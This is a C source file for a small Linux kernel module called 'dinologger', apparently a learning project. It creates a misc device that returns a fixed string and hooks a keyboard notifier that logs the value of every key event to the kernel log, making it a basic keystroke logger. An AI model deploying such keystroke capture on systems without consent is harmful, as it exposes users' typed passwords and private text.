#include "linux/init.h"
#include "linux/module.h"
#include "linux/fs.h"
#include "linux/miscdevice.h"
#include "linux/keyboard.h"

#define DEVICE_NAME "dinologger"
#define LOG(msg) printk(KERN_NOTICE DEVICE_NAME ": " msg "\n")
#define LOGF(msg, ...) printk(KERN_NOTICE DEVICE_NAME ": " msg "\n", __VA_ARGS__)

MODULE_LICENSE ("GPL");
MODULE_AUTHOR("DinoMalin");

ssize_t device_read(struct file *, char *, size_t, loff_t *);

int register_device(void);
void unregister_device(void);
int __init m_init(void);
void __exit m_exit(void);

static int keyboard_notifier_call(struct notifier_block *nb,
								  unsigned long code, void *_param);
struct notifier_block keyboard_notifier_block = {
	.notifier_call = keyboard_notifier_call
};

static const char buffer[] = "I'm a dinosaur";
int buffer_size = sizeof(buffer);

static struct file_operations fops = {
	.owner = THIS_MODULE,
	.read = device_read,
};

struct miscdevice misc;
int register_device(void) {
	misc.minor = MISC_DYNAMIC_MINOR;
	misc.name = DEVICE_NAME;
	misc.fops = &fops;

	int res = misc_register(&misc);
	if (res < 0) {
		LOGF("failed to register - error code: %d", res);
		return res;
	}
	LOG("registered device");
	return 0;
}
void unregister_device(void) {
	LOG("unregistering");
	misc_deregister(&misc);
}

ssize_t device_read(struct file *filep, char *user_buffer, size_t len, loff_t *offset) {
	LOG("reading device");

	if (*offset >= buffer_size)
		return 0;
	if (*offset + len > buffer_size)
		len = buffer_size - *offset;
	if (copy_to_user(user_buffer, buffer + *offset, len) != 0)
		return -EFAULT;

	*offset += len;
	return len;
}

static int keyboard_notifier_call(struct notifier_block *nb,
								  unsigned long code, void *_param) {
	struct keyboard_notifier_param *param = _param;
	LOGF("keyboard entry ! code: %u", param->value);
	return 0;
}

int __init m_init(void) {
	LOG("trying to init");
	int err = 0;

	err = register_device();
	if (err)
		return 0;
	err = register_keyboard_notifier(&keyboard_notifier_block);
	if (err)
		unregister_device();
	return 0;
}

void __exit m_exit(void) {
	unregister_device();
	unregister_keyboard_notifier(&keyboard_notifier_block);
	return;
}

module_init(m_init);
module_exit(m_exit);
